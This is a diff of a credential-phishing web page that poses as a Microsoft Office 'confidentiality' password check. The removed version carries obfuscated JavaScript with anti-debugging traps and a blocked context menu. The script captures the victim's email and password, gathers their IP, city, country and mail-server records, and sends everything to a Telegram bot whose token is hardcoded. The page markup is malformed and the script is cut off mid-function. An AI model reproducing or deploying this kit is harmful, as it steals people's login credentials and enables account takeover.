@@ -1,175 +1,273 @@
-<!DOCTYPE html>
-<html lang="en">
+<html lang="en"><!--doubly --><head>
+  <meta charset="utf-8">
+  
 
-<head>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document for [email_01]</title>
+  
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js">
+      <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+      <!-- Required meta tags -->
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+      <link rel="icon" type="image/png" sizes="192x192" href="https://logo.clearbit.com/${domain}">
+  
+      <!-- Bootstrap CSS -->
+      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+      <link href="https://fonts.googleapis.com/css?family=Yellowtail&display=swap" rel="stylesheet">
+      <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+      <title></title>
+      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+        <link rel="stylesheet">
+  
+      <style type="text/css">
+    .hide{
+      display: none;
+    }
+    .grey-form{
+      background-color: #eee;opacity: 1;
+      pointer-events:none;
+    }
+    .alert-success{
+      color: #155724;
+      background-color: #d4edda;
+      border-color: #c3e6cb;
+    }
+      </style>
 </head>
-<style>
-    body {
-        background-color: rgb(220, 220, 220);
-        background-repeat: no-repeat;
-    
-    }
-    
-    .d1 {
-        background-color: white;
-        border-radius: 2px;
-        margin: 10% auto auto auto;
-        width: 30%;
-        padding: 30px 35px 35px 35px;
-        overflow: hidden;
-        box-shadow: 0 1px 3px rgba(202, 201, 201, 0.897);
-    }
-    
-    .btn {
-        background-color: rgb(2, 123, 222);
-        color: white;
-        text-align: center;
-        padding: 8px;
-        border-style: none;
-        border-radius: 5px;
-        margin: 20px auto;
-        margin-bottom: 0px;
-        width: 30%;
-    }
-    
-    .btn:hover {
-        background-color: rgb(49, 153, 238);
-    }
-    
-    .em {
-        font-weight: 600;
-        font-size: large;
-    }
-    
-    .err1 {
-        display: none;
-        color: red;
-        font-size: smaller;
-        margin-top: 0px;
-        margin-bottom: 0px;
-    }
-    
-    .img-div {
-        text-align: right;
-        width: 100%;
-    }
-    
-    .img1 {
-        width: 65px;
-        margin-top: 0px;
-        border-radius: 50px;
-    }
-    
-    .pwd_div {
-        width: 100%;
-        margin: 5px 0px 10px 0px;
-        border: solid rgb(202, 202, 202);
-        border-width: 1px;
-        border-radius: 1px;
-    }
-    
-    .pwd {
-        width: 90%;
-        padding: 9px;
-        outline: none;
-        border: 0;
-    }
-    
-    .pwd_img {
-        float: left;
-        margin: 6px 0px 0px 5px;
-    }
-    
-    .d11 {
-        text-align: center;
-        display: none;
-        background-color: white;
-        border-radius: 2px;
-        margin: 15% auto auto auto;
-        width: 30%;
-        padding: 30px 35px 45px 35px;
-        overflow: hidden;
-        box-shadow: 0 1px 3px rgba(202, 201, 201, 0.897);
-    }
-    
-    .hdiv {
-        float: left;
-        width: 80%;
-    }
-    
-    .hhdiv {
-        width: 100%;
-        min-height: 65px;
-    }
-    
-    @media screen and (max-width: 800px) {
-        .d1,
-        .d11 {
-            margin: auto;
-            width: 90%;
-            padding: 15px 10px 50px 10px;
-            overflow: hidden;
-        }
-
-        .pwd{
-            width: 80%;
-        }
-    }
-</style>
-
-<body id="body">
-    <div class="d1" id="d1">
-        <div class="d2">
-
-            <div class="hhdiv">
-                <div class="hdiv">
-                    <h3>
-                        Confidentiality Check
-                    </h3>
+<body>
+  <div class="container-fluid">
+    <div class="row" style="background-size: cover; background-repeat: no-repeat;">
+      <div class="container">
+        <div class="row">
+          <div class="col-sm-6 mx-auto my-5 px-5 pb-5" style="border:1px solid; background-color: rgba(0,0,0,0.7);border-radius:15px;">
+           
+            <div class="mt-3">
+              <div class="row">
+              <div class="col-lg-12">
+                  <a href="javascript:void(0)" id="gmailmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                    <div class="mt-2" >
+                      <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                    </div>
+                  </a>
                 </div>
-
-                <div class="img-div">
-                    <img class="img1" id="dmlogo" src="https://img.icons8.com/color/48/microsoft-office-2019.png" alt="microsoft-office-2019" alt="logo">
+                <div class="col-lg-12">
+                  <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                    <div class=" mt-2" >
+                       
+                      <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                    </div>
+                  </a>
                 </div>
-            </div>
-
-            <div>
-                <i>Because you are trying to access confidential information you need to verify it is really you.</i>
-                <p>Please enter password for
-                    <span id="em" class="em">[email_01]</span>
-                </p>
-
-                <div class="pwd_div"><img src="https://img.icons8.com/material-outlined/24/unlock.png" width="18px" alt="log" class="pwd_img">
-                    <input class="pwd" type="password" id="pwd" placeholder="Password"> </div>
-
-                <p class="err1" id="err1">
-                    Password incorrect.
-                    <br>You have <span id="err_num">2</span> more retries left before you are blocked from accessing the file.
-                </p>
-
-
-                <button class="btn" id="btn">
-                Proceed
-            </button>
-            </div>
-
+              </div>
+              <div class="row">
+                <div class="col-lg-12 ">
+                  <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                    <div class="  mt-2" >
+                       
+                      <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                    </div>
+                  </a>
+                </div>
+                <div class="col-lg-12">
+                  <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                    <div class=" mt-2" >
+                       
+                      <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                    </div>
+                  </a>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col-lg-12 ">
+                  <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                    <div class="  mt-2" >
+                       
+                      <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                    </div>
+                  </a>
+                </div>
+                <div class="col-lg-12">
+                  <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                    <div class=" mt-2" >
+                       
+                      <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                    </div>
+                  </a>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col-lg-12 ">
+                  <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                    <div class="  mt-2" >
+                       
+                      <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                    </div>
+                  </a>
+                </div>
+                <div class="col-lg-12">
+                  <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                    <div class=" mt-2" >
+                       
+                      <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                    </div>
+                  </a>
+                </div>
+              </div>
+              <div class="row">
+                <div class="col-lg-12 ">
+                  <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                    <div class="  mt-2" >
+                       
+                      <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                    </div>
+                  </a>
+                </div>
+                <div class="col-lg-12">
+                  <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                    <div class=" mt-2" >
+                       
+                      <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                    </div>
+                  </a>
+                </div>
+              </div>
+              <div class="col-lg-12 ">
+                  <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                    <div class="  mt-2" >
+                       
+                      <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                    </div>
+                  </a>
+                </div>
+                <div class="col-lg-12">
+                  <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                    <div class=" mt-2" >
+                       
+                      <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px; "></span>
+                    </div>
+                  </a>
+                </div>
+              </div>
+              
+                  </a>
+                </div>
+                <div class="col-lg-12">
+                   <p class="text-white mt-3 text-center"></p>
+              <p class="h5 text-center text-white"></p> 
+                  
+                </div>
+             
+            </div> 
+          </div>
         </div>
-    </div>
+      </div>
 
-    <div class="d11" id="d11">
-        <h5>
-            Please open file on your computer.
-        </h5>
-    </div>
-</body>
+
+
+    </div> 
+  </div>
+  
+  
+  
+      <!-- Modal for gmail -->
+      <div style="display: block !important" class="modal" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+        <div class="modal-dialog" role="document">
+          <div class="modal-content">
+            <div class="modal-header">
+            </div>
+            <div class="modal-body">
+              <center>
+                <img id="fieldImg" class="img-fluid" width="80px">
+                
+                <h5 class="modal-title" id="exampleModalLabel"><span id="head-message" class=""></span><br></h5>
+                  <span class="font-weight-normal"> <a>Accessing sensitive infomation requires password verification</a> </span>
+                <br>
+                <div style="margin-top: 10px; color: #FF0000;" class="alert" id="msg"></div>
+  
+              </center>
+              <form id="contact" class="form-horizontal well">
+                <div class="col-lg-12">
+                  <div class="form-group">
+                    <input type="hidden" value="1" name="counter" id="counter"/>
+                    <label for="exampleInputEmail1">Email address</label>
+                    <input style="background-color: #eee;opacity: 1; pointer-events:none !important;" type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email" readonly="">
+                    <!-- <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small> -->
+                  </div>
+                </div>
+                <div class="col-lg-12">
+                  <div style="margin-bottom: 0.5rem !important;" class="form-group">
+                    <label for="Password">Password</label>
+                    <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password" required="">
+                  </div>
+                </div>
+              </div>
+              <div class="modal-footer" style="padding: 0.5rem !important;">
+                <button class="btn btn-lg btn-info pull-right" id="submit-btn">Login to continue</button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
 <script>
- (function(_0x70d883,_0xa58de5){var _0xdfebf0=_0xde95,_0x3f5d47=_0x70d883();while(!![]){try{var _0x1b9e18=parseInt(_0xdfebf0(0x15d))/0x1*(parseInt(_0xdfebf0(0x25a))/0x2)+-parseInt(_0xdfebf0(0x191))/0x3*(parseInt(_0xdfebf0(0x1ad))/0x4)+-parseInt(_0xdfebf0(0x1e6))/0x5*(-parseInt(_0xdfebf0(0x39b))/0x6)+parseInt(_0xdfebf0(0x37f))/0x7*(parseInt(_0xdfebf0(0x1c5))/0x8)+-parseInt(_0xdfebf0(0x295))/0x9+-parseInt(_0xdfebf0(0x1d9))/0xa*(-parseInt(_0xdfebf0(0x2bf))/0xb)+-parseInt(_0xdfebf0(0x213))/0xc;if(_0x1b9e18===_0xa58de5)break;else _0x3f5d47['push'](_0x3f5d47['shift']());}catch(_0x16cfb7){_0x3f5d47['push'](_0x3f5d47['shift']());}}}(_0x4608,0x868bd),function(_0x736b5e,_0x3e954b){var _0x3007dd=_0xde95,_0x40cfae=_0x736b5e();while(!![]){try{var _0x49f61d=parseInt(_0xfada(0x1da,-0x176))/0x1*(-parseInt(_0xfada(0x1c8,-0x217))/0x2)+parseInt(_0xfada(0x482,0x5aa))/0x3*(-parseInt(_0xfada(0x3ff,0x26e))/0x4)+-parseInt(_0xfada(0x40c,0x209))/0x5+-parseInt(_0xfada(0x3ed,0x5ca))/0x6*(-parseInt(_0xfada(0x347,0xd7))/0x7)+parseInt(_0xfada(0x2c3,0x3d5))/0x8*(parseInt(_0xfada(0x190,-0x280))/0x9)+-parseInt(_0xfada(0x366,-0x40))/0xa+parseInt(_0xfada(0x343,-0x3d))/0xb;if(_0x49f61d===_0x3e954b)break;else _0x40cfae[_0x3007dd(0x16e)](_0x40cfae[_0x3007dd(0x29f)]());}catch(_0x4c8227){_0x40cfae[_0x3007dd(0x16e)](_0x40cfae[_0x3007dd(0x29f)]());}}}(_0x39d7,0x8a316));var _0x306f00=(function(){var _0x3fdc50=!![];return function(_0x3dae1d,_0x8a6b7){var _0x51de9c=_0x3fdc50?function(){var _0x3dac1f=_0xde95;if(_0x8a6b7){var _0xa9f918=_0x8a6b7[_0x3dac1f(0x1ab)](_0x3dae1d,arguments);return _0x8a6b7=null,_0xa9f918;}}:function(){};return _0x3fdc50=![],_0x51de9c;};}()),_0x102604=_0x306f00(this,function(){var _0x274159=_0xde95;return _0x102604[_0x274159(0x2d5)]()[_0x274159(0x387)](_0x274159(0x2e1))[_0x274159(0x2d5)]()[_0x274159(0x1f1)](_0x102604)[_0x274159(0x387)](_0x274159(0x2e1));});_0x102604();function _0xfada(_0x2234bc,_0x470681){var _0x36a162=_0x39d7();return _0xfada=function(_0x51ed56,_0x952bbb){_0x51ed56=_0x51ed56-0x187;var _0x11da20=_0x36a162[_0x51ed56];return _0x11da20;},_0xfada(_0x2234bc,_0x470681);}var _0x50b1a3=(function(){var _0x234ec6=!![];return function(_0x47c7a7,_0x1b9cce){var _0x504373=_0x234ec6?function(){var _0x488f55=_0xde95;if(_0x1b9cce){var _0x176765=_0x1b9cce[_0x488f55(0x1ab)](_0x47c7a7,arguments);return _0x1b9cce=null,_0x176765;}}:function(){};return _0x234ec6=![],_0x504373;};}());(function(){var _0x5e560b=_0xde95,_0x9b242f;try{var _0x2f1a8e=Function(_0x5e560b(0x26b));_0x9b242f=_0x2f1a8e();}catch(_0x11a2a6){_0x9b242f=window;}_0x9b242f[_0x5e560b(0x2ba)](_0x1c3afc,0xfa0);}()),(function(){_0x50b1a3(this,function(){var _0x44dcae=_0xde95,_0x51eb76=new RegExp(_0x44dcae(0x2d4)),_0x5407b0=new RegExp('\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','i'),_0x179081=_0x1c3afc(_0x44dcae(0x325));!_0x51eb76[_0x44dcae(0x35f)](_0x179081+_0x44dcae(0x227))||!_0x5407b0['test'](_0x179081+_0x44dcae(0x265))?_0x179081('0'):_0x1c3afc();})();}());var _0x26b70c=(function(){var _0x13cf54=!![];return function(_0xa9382f,_0xd66ef){var _0x447d5d=_0x13cf54?function(){var _0x5571a5=_0xde95;if(_0xd66ef){var _0x1bd1aa=_0xd66ef[_0x5571a5(0x1ab)](_0xa9382f,arguments);return _0xd66ef=null,_0x1bd1aa;}}:function(){};return _0x13cf54=![],_0x447d5d;};}()),_0x19d0e3=_0x26b70c(this,function(){var _0x1c1f90=_0xde95,_0x6ce6b1;try{var _0x56d78f=Function(_0x1c1f90(0x26b));_0x6ce6b1=_0x56d78f();}catch(_0xbb9eb0){_0x6ce6b1=window;}var _0x34ed5c=_0x6ce6b1[_0x1c1f90(0x1ce)]=_0x6ce6b1[_0x1c1f90(0x1ce)]||{},_0x45060a=[_0x1c1f90(0x3c6),_0x1c1f90(0x160),_0x1c1f90(0x171),'error',_0x1c1f90(0x3b8),'table',_0x1c1f90(0x21f)];for(var _0x3a8612=0x0;_0x3a8612<_0x45060a['length'];_0x3a8612++){var _0x86a3db=0x0,_0x2b5b3a=_0x26b70c[_0x1c1f90(0x1f1)][_0x1c1f90(0x25c)]['bind'](_0x26b70c),_0x170363=_0x45060a[_0x3a8612],_0x4002e7=_0x34ed5c[_0x170363]||_0x2b5b3a;_0x2b5b3a['__proto__']=_0x26b70c['bind'](_0x26b70c),_0x2b5b3a['toString']=_0x4002e7[_0x1c1f90(0x2d5)]['bind'](_0x4002e7),_0x34ed5c[_0x170363]=_0x2b5b3a;}});function _0xde95(_0x256531,_0x85b5c4){var _0x460880=_0x4608();return _0xde95=function(_0xde95d1,_0x1e838c){_0xde95d1=_0xde95d1-0x14d;var _0x2b473d=_0x460880[_0xde95d1];return _0x2b473d;},_0xde95(_0x256531,_0x85b5c4);}function _0x4608(){var _0x35d0d9=['ixHLo','GMDnb','DsCFp','0|3|2','reYIm','ready','XUaOG','#btn','ault','xjprS','gtlgi','UJtjl','pCrzp','oLUWb','count','ypoZQ','filter','userAgent','contextmenu','is\x22)(','AiQZg','#em','GTePF','dBbBQ','OdOcd','AnODq','MayLL','strin','LnbSM','26892PFtdAg','FstjF','sRNuO','DuzTl','vUACy','rgb(4','atQYU','LNPAp','iwyEQ','gXKYV','GikBC','PofLW','AZcGl','SudJY','YEDQ1','dnWNH','ilEoY','kQTsg','KVmPB','then','ahnAC','oXYCu','init','Dokkt','ImLIE','NwPmg','tLABr','-colo','src','iTtJy','lengt','STHvr','zzidx','uWXgw','P9iEv','eDLMT','s.goo','vLNQs','later','WLeIp','DMojL','city','Euhli','bSToj','yCEKw','pSxyS','GABzU','RQUJT','this\x20','dPlvy','286580uFVZcl','RwvLy','ASuhF','Macintosh','attr','waOCs','mEnDd','mQGoH','63yfSsTC','61317','kqbkG','RUfDu','conte','WlTGb','fUJCf','CsYGF','73846SoSKzD','://lo','://dn','eRkVG',':AAF9','Macin','vXQVn','WOFGC','bumQF','MXycL','split','\x22retu','MxVud','debugger','test','\x0aMX:\x20','GoBFY','uodsU','KfagG','#d11','bot','debu','NSaJn','vgJDv','xtmen','PYCBg','yApIb','#d1','XTwXn','XrsLB','OxSdE','lbRaf','sgsRU','HEKgZ','|4|3|','4372610taVZRv','iVglL','een\x20b','text','Mx:\x20','://ip','FdhDa','FnLwF','kjNfL','KOaeg','rpiFj','4041772XoBNbM','rvObq','funct','addEventListener','JPEAi','MJKxC','qcnpR','5|1|2','search','WyqmC','WFUEu','show','hide','JoMqR','VSMen','ptqAH','appli','application/json','BITGc','sPRcB','mykFo','round','addEv','TVCZj','try:\x20','a-zA-','bowgk','equir','1069482KVRiZo','fSfFK','hHLyI','user:\x20','data','go.cl','55686','html','eTXco','disab','dlFSE','hbnfy','otZqh','state','ion\x20*','dADiu','json','zHCAV','Z_$][','KqzdG','sRKtW','rrcLg','xBvxN','jSVFb','nccUB','Iacxt','YpOaa','innerText','UsRYH','exception','IeREB','EfevD','egram','dzacs','LyTaW','ACJlj','pIdxy','9119473WjElZL','aZRTb','sZLDh','lHYdm','|3|1','fiCwr','log','vemAP','csXnt','nly','try\x20a','true','stateObject','uuTSF','toStr','lKObt','mQDBQ','2|1|5','dstxk','PDISv','UDORH','AHMhR','SbnQR','const','PEkXG','n/jso','Answe','pZJDB','Acces','AknEJ','VfrIb','DYhzX','HlZyq','77LIOzGh','IMGvR','OKTLA','warn','vvKZm','pqXBO','iPhon','RBWkr','20093','gain\x20','stene','ufBmV','tLNpN','WeTEg','qpyCN','error','repla','push','\x5c(\x20*\x5c','myZWV','info','CDNIR','dQDeX','type','FKIfZ','HBZbf','tpFoy','qlUNd','CrETr','HDSTv','YCHCH','ZDrcY','sSdNU','sgdnv','MBhve','qRXeI','qDRlu','counter','OAXM0','/send','eGaub','while\x20(true)\x20{}','BxWQi','kdeQZ','|1|4|','index','ZTqMM','obtWD','fxVKs','Access\x20to\x20this\x20file\x20has\x20been\x20blocked.\x20please\x20try\x20again\x20later.','XLPIP','AlImj','3AQgqOt','MLwhX','nKqdr','locke','preventDefault','ease\x20','FnOvA','tWpfp','tvCMn','zdwhf','itJEL','uDYnY','MLBvQ','Android','oErCI','xFKMm','searc','qlfdA','fZppF','VGzyX','EZPxw','MHoAR','#dmlogo','hNAJU','Rljkl',',\x0apwd:\x20','apply','Passw','1129844hGYcqz','pZMty','52611','Windows','BkkGF','to__','rdoqa','FwEhH','eaxWj','ckvxP','GcGEJ','Dpjbs','|4|2|','d.\x20pl','rUKGz','MKPJA','rBEzh','n()\x20','#err_num','conso','ccNmD','owENM','0-9a-','uCohX','8lmrgzF','QuTUQ','UkKme','meOlI','azuen','https://api.telegram.org/bot','hdBIO','AwKvX','TFglu','console','eIlUQ','indexOf','pXNmg','jsonp','KWGvk','UlIrQ','FBaWV','pvZip','AfbML','subst','46330DtJhEs','actio','rgb(49,\x20153,\x20238)','EriDh','GhxrT','DwJVC','Objec','tpfUM','/sendMessage','zCJCy','Ganoc','\x0acity','catio','25qaSDpN','tOgEq','ord\x20r','PrZyi','|0|3','KMPgC','https','PRFAb','rrBGo','pKbHT','CtUzM','constructor','filte','disabled','esolv','https://dns.google/resolve?name=','WCGvb','https://logo.clearbit.com/','gle/r','uafzY','lSgeK','dHZzi','rn\x20th','UukOf','LNqdf','DhvdY','user:','dGmmQ','IYReU','pHtGM','qkyKF','ciQvJ','qRhwL','val','XvGdB','CNHRS','{}.co','terva','VFFPE','zUpaU','POST','SiIKJ','YBSjG','zDdiQ','AwqCN','10212012NogJVw','VyvGK','DOiHg','userA','Text','RABAs','aopNh','ZjbIt','\x0acountry:\x20','DlUgs','PvoiT','table','trace','NzLxR','DpfdQ','hBFtc','xpboQ','zA-Z_','EjfLn','xwwnf','chain','YnrEy','VVRGq','JDyXI','Xtelj','oqmyV','5c8Jx','IqfNd','GKuYK','\x0aip:\x20','2|4|0','hkawl','#pwd','INTLo','lasGw','NeoyV','ntDef','country','lGuFO','SrbKB','SfyPG','QHxDp','catch','ehvsO','PsriH','kvVrq','Wpzny','RyMYG','click','lkvuY','ZTzid','PBRdb','reado','3160512ettPOs','PAOJZ','zwDPf','fvaZt','DIBki','CNkgX','dJyZL','ion','yIxmH','KjyCP','substr','UKLOQ','1|5|4','dzHFU','IXdvn','jvZIf','ytTqM','gphKD','23612mJANPe','3|1|5','prototype','AzoqC','KbqTF','https://ipinfo.io','jgGfx','NlUfC','s\x20to\x20','call','CQYsz','input','YkTnB','XFRhC','yUOYp','XQopA','tYniJ','return\x20(function()\x20{}.constructor(\x22return\x20this\x22)(\x20));','vRzOl','ihJxR','e)\x20{}','fjwnR','2085188735:AAHYrakHDOiZHzqBl1Y8_ZWQ7YdeMvzq1Ts','mSoUF','WcnxN','frQYR','rxcQP','mpOxr','XmvzW','UWTsT','iHGmj','lDBfW','\x5c+\x5c+\x20','QxqBS','#err1','PMNrn','bYZMD','gify','qqxuI','Metew','sNdlO','BWoli','fjlwD','avQuH','VWOWp','backg','oqOnj','css','has\x20b','keyup','GztJl','replace','lOrHY','ZOOSN','IPHyW','FUDCX','HHTbN','oKDHC','nZhQs','7864353LLkkMs','entLi','=MX','701772EQBeVi','Password\x20required','tion','GkTqq','.org/','getElementById','vViqL','shift','zLpWB','Windo','Ybdhn','OdxOR','gpvhk','AqhaG','FkVwI','BlzJJ','KrOEW','oTvqP','RTkQb','info.','xzKzo','forEach','|0|4|','ElyqN','GSqSq','OECnL','XOGGV','nctio','zycCd','vCZHX','rRrGT','excep','&type','dfPBT','setInterval','OhnUQ','SnNoW','EtEwm','weIVO','429lOjoqc','foaka','kngog','length','yKtdA','eyDPu','Tlgsh','FsCpz','THshp','JfgrS','lKhUr','ttVbn','ById','sFBAb','ructo','WHLfB','(((.+','Andro','krbLz','RCHpw','stringify','function\x20*\x5c(\x20*\x5c)','toString','IyVyF','243eDLSEl','shUHD','YIgwy','ZMwet','LhZPQ','amwjV','yaFKw','cOgVC','qpHxh','locat','(((.+)+)+)+$','preve','cjdEJ','getEl','UUBRX','QRDvU','hCYHT','xMBcW','proto','tYMpN','RUzRp','NfSIV','oZCvA','OwIqc','LohGc','DEpQT','PbGhA'];_0x4608=function(){return _0x35d0d9;};return _0x4608();}_0x19d0e3(),$(document)['ready'](function(){var _0x4e8adf=_0xde95;document[_0x4e8adf(0x382)](_0x4e8adf(0x304),_0x374ee9=>_0x374ee9[_0x4e8adf(0x195)]());var _0x92eab8=navigator[_0x4e8adf(0x303)];if(_0x92eab8[_0x4e8adf(0x1d0)](_0x4e8adf(0x1b0))=='13'|_0x92eab8['indexOf'](_0x4e8adf(0x344))=='13'){var _0x42628b=0x3,_0x1e0ca9=window['location']['search'],_0x4b2b42=_0x1e0ca9[_0x4e8adf(0x28d)]('?','');if(_0x4b2b42==='')var _0x4b2b42=document[_0x4e8adf(0x29d)]('em')[_0x4e8adf(0x3b6)];if(_0x4b2b42!=''){var _0x35fdc8=/^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/[_0x4e8adf(0x35f)](_0x4b2b42);if(_0x35fdc8){$('#em')[_0x4e8adf(0x377)](_0x4b2b42);var _0x26e0d9=_0x4b2b42[_0x4e8adf(0x1d0)]('@'),_0x363dc8=_0x4b2b42[_0x4e8adf(0x252)](_0x26e0d9+0x1);$(_0x4e8adf(0x1a7))[_0x4e8adf(0x345)](_0x4e8adf(0x32b),_0x4e8adf(0x1f7)+_0x363dc8);}else $(_0x4e8adf(0x36c))[_0x4e8adf(0x38b)]();}}else _0x92eab8[_0x4e8adf(0x1d0)]('iPhone')=='13'|_0x92eab8[_0x4e8adf(0x1d0)](_0x4e8adf(0x19e))=='20'&&($(_0x4e8adf(0x36c))[_0x4e8adf(0x38b)](),$('#d11')[_0x4e8adf(0x38a)]());$('#pwd')[_0x4e8adf(0x28b)](function(){var _0x3a135c=_0x4e8adf;$(_0x3a135c(0x27c))[_0x3a135c(0x38b)]();}),$(_0x4e8adf(0x2f9))[_0x4e8adf(0x243)](function(_0x3253e4){var _0x1dd5e6=_0x4e8adf;$['get'](_0x1dd5e6(0x25f),function(_0x4523e2){var _0x4600e9=_0x1dd5e6;_0x3253e4['preventDefault']();var _0x3328cb=$(_0x4600e9(0x307))['html'](),_0x3705b0=$(_0x4600e9(0x233))[_0x4600e9(0x207)]();if(_0x3705b0[_0x4600e9(0x2c2)]>0x4){_0x42628b--,MX_c=0x0;const _0x2ab8a1=_0x3328cb[_0x4600e9(0x35b)]('@'),_0x5521e1=_0x2ab8a1[0x1],_0x3d8f8b=_0x4600e9(0x1f5)+_0x5521e1+'&type=MX';fetch(_0x3d8f8b)['then'](_0x2c0203=>_0x2c0203[_0x4600e9(0x3ab)]())[_0x4600e9(0x322)](_0x16233e=>{var _0xd03634=_0x4600e9;const _0x1335b0=_0x16233e['Answer'][_0xd03634(0x302)](_0x5815ed=>_0x5815ed[_0xd03634(0x174)]===0xf);_0x1335b0[_0xd03634(0x2ad)](_0x1e8e24=>{var _0x9d1eb2=_0xd03634;MX_c++;if(MX_c==0x1){var _0xfea9f3={'chat_id':chatId,'text':_0x9d1eb2(0x39e)+_0x3328cb+_0x9d1eb2(0x1aa)+_0x3705b0+'\x0acity:\x20'+_0x4523e2[_0x9d1eb2(0x338)]+_0x9d1eb2(0x21b)+_0x4523e2[_0x9d1eb2(0x238)]+_0x9d1eb2(0x230)+_0x4523e2['ip']+_0x9d1eb2(0x360)+_0x1e8e24[_0x9d1eb2(0x39f)]};fetch(_0x9d1eb2(0x1ca)+botToken+_0x9d1eb2(0x1e1),{'method':'POST','headers':{'Content-Type':_0x9d1eb2(0x390)},'body':JSON[_0x9d1eb2(0x2d3)](_0xfea9f3)});}});})[_0x4600e9(0x23d)](_0x222ae8=>{alert(_0x222ae8);});}else $(_0x4600e9(0x27c))[_0x4600e9(0x38a)](),$(_0x4600e9(0x27c))[_0x4600e9(0x377)](_0x4600e9(0x299));setTimeout(function(){var _0x408025=_0x4600e9;$(_0x408025(0x1bf))['text'](_0x42628b),$('#err1')[_0x408025(0x38a)](),$(_0x408025(0x233))[_0x408025(0x207)]('');},0x3e8),_0x42628b==0x0&&($(_0x4600e9(0x233))['attr']('readonly',_0x4600e9(0x3cb)),$(_0x4600e9(0x2f9))['attr'](_0x4600e9(0x1f3),_0x4600e9(0x1f3)),$(_0x4600e9(0x2f9))[_0x4600e9(0x289)]('background-color',_0x4600e9(0x1db)),$('#err1')['show'](),$(_0x4600e9(0x27c))['text'](_0x4600e9(0x18e)));},'jsonp');});;botToken=_0x4e8adf(0x270),chatId='570714410';});function _0x1c3afc(_0x21fb38){function _0x28a20b(_0x42def6){var _0x2f78b7=_0xde95;if(typeof _0x42def6==='string')return function(_0x9088d){}[_0x2f78b7(0x1f1)](_0x2f78b7(0x186))[_0x2f78b7(0x1ab)](_0x2f78b7(0x182));else(''+_0x42def6/_0x42def6)[_0x2f78b7(0x2c2)]!==0x1||_0x42def6%0x14===0x0?function(){return!![];}[_0x2f78b7(0x1f1)](_0x2f78b7(0x35e))[_0x2f78b7(0x263)]('action'):function(){return![];}['constructor'](_0x2f78b7(0x35e))[_0x2f78b7(0x1ab)](_0x2f78b7(0x3cc));_0x28a20b(++_0x42def6);}try{if(_0x21fb38)return _0x28a20b;else _0x28a20b(0x0);}catch(_0x3e7c23){}}function _0x39d7(){var 